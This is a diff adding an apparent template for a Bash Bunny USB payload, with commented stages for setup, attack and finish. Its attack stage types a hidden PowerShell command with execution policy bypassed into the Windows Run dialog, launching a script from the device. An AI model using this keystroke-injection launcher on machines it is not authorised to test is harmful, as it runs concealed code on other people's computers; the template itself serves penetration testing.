@@ -1,0 +1,31 @@
+# Title:
+# Description:
+# Author:
+# Contributors:
+# Target:
+# Dependencies:
+
+# Configuration options
+LOOTDIR=/root/udisk/loot/payload-name #this is just an example
+
+# Remember to title each stage and briefly describe each function.
+# Setting LED states is also super helpful.
+# Below is an example.
+
+# Initialization stage
+# Sets CPU governor to use one core and defines attack mode.
+LED SETUP
+CUCUMBER ENABLE
+ATTACKMODE HID STORAGE
+
+# Attack stage
+# Runs the PowerShell script from the run dialog.
+LED ATTACK
+QUACK GUI r
+QUACK DELAY 100
+QUACK STRING powershell -NoP -ExecutionPolicy Bypass -NonI -W Hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\script.ps1')"
+
+# Finished stage
+# Sets the LED to green. Wait until script execution is complete before
+# unplugging the bunny.
+LED FINISH
